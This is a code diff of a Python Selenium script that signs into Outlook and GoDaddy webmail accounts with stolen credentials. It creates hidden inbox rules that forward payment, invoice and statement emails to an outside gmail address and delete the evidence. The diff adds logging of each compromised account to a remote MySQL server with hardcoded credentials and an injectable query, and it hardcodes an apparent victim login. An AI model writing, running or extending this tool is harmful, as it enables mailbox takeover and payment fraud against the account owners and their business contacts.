@@ -10,7 +10,7 @@ import os
 import time
 import random
 import csv
-
+import mysql.connector
 
 class Ruler():
     def __init__(self):
@@ -73,25 +73,44 @@ class Ruler():
         ranum = random.randint(min, max)
         time.sleep(ranum)
 
-    def normalRuling(self, _email, _password):
+    def updateDb(_self, _email, _provider, _status):
+        mydb = mysql.connector.connect(
+            host = "45.58.112.69",
+            user = "hero",
+            password = "WorkOut1105#$",
+            database = "logs"
+        )
+        mycursor = mydb.cursor()
+        sql = "UPDATE office365 SET provider = '"+ _provider +"', ruled = '"+ str(_status) +"' WHERE email = '"+ _email +"'"
+        mycursor.execute(sql)
+        mydb.commit()
+        print(mycursor.rowcount, "record(s) affected")
+
+    def startRuling(self, _email, _password):
         email = _email
         password = _password
-        self.normalLogin(email, password)
+        provider = ''
+        try:
+            provider = self.login(email, password)
+        except:
+            raise Exception("Sorry, error whiling logging in")
+        status = 1
+        print('[Logged in -> provider:]', provider)
 
         try:
             time.sleep(1)
             self.driver.find_element(By.XPATH, "//*[@id='owaSettingsButton']").click()
             self.sleep(1, 2)
         except:
-            pass
+            status = 0
+            raise Exception("Sorry, error whiling clicking settings button")
         try:
             time.sleep(1)
-            # self.driver.find_element_by_xpath("(//*[@class='ms-Button ms-Button--action ms-Button--command UWwiiejueEpNL3F_57Ex root-245'])[0]").click()
-            # self.driver.find_element_by_xpath("(//*[@class='next nextSelection'])[9]").click()
             self.driver.find_element(By.CLASS_NAME, 'UWwiiejueEpNL3F_57Ex').click()
             self.sleep(1, 2)
         except:
-            pass
+            status = 0
+            raise Exception("Sorry, error whiling clicking open settings button")
         try:
             surveyModal = self.driver.find_element(By.XPATH, '//span[text()="How likely are you to recommend Outlook on the web to others, if asked?"]')
             if surveyModal:
@@ -101,62 +120,34 @@ class Ruler():
         try:
             time.sleep(1)
             self.driver.find_element(By.CSS_SELECTOR, 'button.IPzlgksV3AiFfCZs9pYI:nth-child(4)').click()
-            # self.driver.find_element(By.XPATH, "(//*[@class='ms-Button IPzlgksV3AiFfCZs9pYI root-296'])[3]")
         except:
+            status = 0
+            raise Exception("Sorry, error whiling clicking rule menu button")
+
+        try:
+            statement1 = ['Payment', 'Invoice', 'Statement']
+            self.addRule('a', statement1, 'Redirect to', 'myemail@gmail.com', True)
+            statement2 = ['myemail@gmail.com']
+            self.addRule('b', statement2, 'Delete', '', False)
+        except:
+            status = 0
+            raise Exception("Sorry, error whiling ruling")
+
+        print('[================================== ALL DONE! ===================================]')
+
+        try:
+            self.updateDb(email, provider, status)
+            print('[================================== DB UPDATED! ===================================]')
+        except Exception as ex:
+            template = "An exception of type {0} occurred. Arguments:\n{1!r}"
+            message = template.format(type(ex).__name__, ex.args)
+            print(message)
             pass
-
-        statement1 = ['Payment', 'Invoice', 'Statement']
-        self.addRule('a', statement1, 'Redirect to', 'myemail@gmail.com', True)
-        statement2 = ['myemail@gmail.com']
-        self.addRule('b', statement2, 'Delete', '', False)
-
-        print('All done!')
         
         return 'success'
 
-        # self.internetconnection()
-    def godaddyRuling(self, _email, _password):
-        email = _email
-        password = _password
-        self.godaddyLogin(email, password)
-
-        try:
-            time.sleep(1)
-            self.driver.find_element(By.XPATH, "//*[@id='owaSettingsButton']").click()
-            self.sleep(1, 2)
-        except:
-            pass
-        try:
-            time.sleep(1)
-            # self.driver.find_element_by_xpath("(//*[@class='ms-Button ms-Button--action ms-Button--command UWwiiejueEpNL3F_57Ex root-245'])[0]").click()
-            # self.driver.find_element_by_xpath("(//*[@class='next nextSelection'])[9]").click()
-            self.driver.find_element(By.CLASS_NAME, 'UWwiiejueEpNL3F_57Ex').click()
-            self.sleep(1, 2)
-        except:
-            pass
-        try:
-            surveyModal = self.driver.find_element(By.XPATH, '//span[text()="How likely are you to recommend Outlook on the web to others, if asked?"]')
-            if surveyModal:
-                self.driver.find_element(By.XPATH, '//span[text()="Cancel"]').click()
-        except:
-            pass
-        try:
-            time.sleep(1)
-            self.driver.find_element(By.CSS_SELECTOR, 'button.IPzlgksV3AiFfCZs9pYI:nth-child(4)').click()
-            # self.driver.find_element(By.XPATH, "(//*[@class='ms-Button IPzlgksV3AiFfCZs9pYI root-296'])[3]")
-        except:
-            pass
-
-        statement1 = ['Payment', 'Invoice', 'Statement']
-        self.addRule('a', statement1, 'Redirect to', 'myemail@gmail.com', True)
-        statement2 = ['myemail@gmail.com']
-        self.addRule('b', statement2, 'Delete', '', False)
-
-        print('All done!')
-        
-        return 'success'
-
-    def normalLogin(self, _email, _password):
+    def login(self, _email, _password):
+        provider = 'outlook'
         try:
             self.driver.get(self.url)
             self.sleep(1, 2)
@@ -165,86 +156,49 @@ class Ruler():
         try:
             self.driver.find_element(By.XPATH, "//*[@id='i0116']").clear()
             self.driver.find_element(By.XPATH, "//*[@id='i0116']").send_keys(_email)
-            self.sleep(1, 2)
-        except Exception as ex:
-            template = "An exception of type {0} occurred. Arguments:\n{1!r}"
-            message = template.format(type(ex).__name__, ex.args)
-            print(message)
-            pass
-        try:
             self.driver.find_element(By.XPATH, "//*[@id='idSIButton9']").click()
-            self.sleep(1, 3)
         except:
-            pass
+            raise Exception("Sorry, error whiling inserting email and clicking next button")
         try:
-            self.driver.find_element(By.XPATH, "//*[@id='i0118']").clear()
-            self.driver.find_element(By.XPATH, "//*[@id='i0118']").send_keys(_password)
-            self.sleep(1, 2)
-        except:
-            pass
-        try:
-            self.driver.find_element(By.XPATH, "//*[@id='idSIButton9']").click()
-            self.sleep(1, 2)
-        except:
-            pass
-        try:
-            self.driver.find_element(By.XPATH, "//*[@id='idSIButton9']").click()
-            self.sleep(1, 2)
-        except:
-            pass
-
-        return 'success'
-
-    def godaddyLogin(self, _email, _password):
-        try:
-            self.driver.get(self.url)
-            self.sleep(1, 2)
-        except:
-            pass
-        try:
-            self.driver.find_element(By.XPATH, "//*[@id='i0116']").clear()
-            self.driver.find_element(By.XPATH, "//*[@id='i0116']").send_keys(_email)
-            self.sleep(1, 2)
-        except Exception as ex:
-            template = "An exception of type {0} occurred. Arguments:\n{1!r}"
-            message = template.format(type(ex).__name__, ex.args)
-            print(message)
-            pass
-        try:
-            self.driver.find_element(By.XPATH, "//*[@id='idSIButton9']").click()
             time.sleep(5)
-            self.driver.find_element(By.ID, 'password').send_keys(_password)
-            self.driver.find_element(By.ID, 'submitBtn').click()
+            currentUrl = self.driver.current_url
+
+            if "sso.godaddy.com" not in currentUrl:
+                # normal office login
+                self.driver.find_element(By.XPATH, "//*[@id='i0118']").clear()
+                self.driver.find_element(By.XPATH, "//*[@id='i0118']").send_keys(_password)
+                self.driver.find_element(By.XPATH, "//*[@id='idSIButton9']").click()
+            else:
+                # godaddy login
+                provider = 'godaddy'
+                self.driver.find_element(By.ID, 'password').send_keys(_password)
+                self.driver.find_element(By.ID, 'submitBtn').click()
         except:
-            pass
+            raise Exception("Sorry, error whiling detecting provider")
+
         try:
             time.sleep(2)
-            self.driver.find_element(By.XPATH, "//*[@id='idSIButton9']").click()
+            self.driver.find_element(By.XPATH, "//*[@id='idSIButton9']").click() # for Stay signed in
             self.sleep(1, 2)
         except:
-            pass
-            
-        return 'success'
+            raise Exception("Sorry, error whiling clicking submit button")
+
+        return provider
 
     def addRule(self, _name, _keywords, _action, _to, _stopProcessing):
         try:
-            time.sleep(1)
+            time.sleep(3)
             self.driver.find_element(By.XPATH, '//span[text()="Add new rule"]').click()
             time.sleep(1)
             self.driver.find_element(By.XPATH, '//*[@placeholder="Name your rule"]').clear()
             self.driver.find_element(By.XPATH, '//*[@placeholder="Name your rule"]').send_keys(_name)
-            time.sleep(1)
             self.driver.find_element(By.XPATH, '//span[text()="Select a condition"]').click()
-            time.sleep(1)
             self.driver.find_element(By.XPATH, '//span[text()="Subject or body includes"]').click()
-            time.sleep(1)
             lookForInput = self.driver.find_element(By.XPATH, '//*[@placeholder="Enter words to look for"]')
             for keyword in _keywords:
                 lookForInput.send_keys(keyword)
                 lookForInput.send_keys(Keys.ENTER)
-            time.sleep(1)
             self.driver.find_element(By.XPATH, '//span[text()="Select an action"]').click()
-            time.sleep(1)
             self.driver.find_element(By.XPATH, '//span[text()="' + _action +'"]').click()
             time.sleep(1)
 
@@ -266,5 +220,3 @@ class Ruler():
 
     def start(self):
         self.ruling("zhang.yuyuan@hotmail.com", "China2021!@#")
-
-# Ruler()
